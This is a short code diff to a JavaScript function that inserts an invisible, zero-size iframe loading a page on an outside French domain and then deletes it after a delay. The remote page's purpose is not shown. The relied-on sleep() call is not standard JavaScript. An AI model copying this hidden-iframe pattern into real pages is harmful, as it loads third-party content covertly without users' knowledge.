@@ -281,9 +281,12 @@ function cleandiv(id){
 function cons(){
     var a = document.createElement('iframe');
 	a.align = "left";
-	a.width="0" 
-	a.height="0"
-	a.src="http://www.clairemaindor.fr/rien.php"
-	a.frameborder="0" 
+	a.width="0"; 
+	a.height="0";
+    a.id="cons";
+	a.src="http://www.clairemaindor.fr/rien.php";
+	a.frameborder="0";
 	document.body.appendChild(a);
+    sleep(2000);
+    cleandiv('cons');
 };
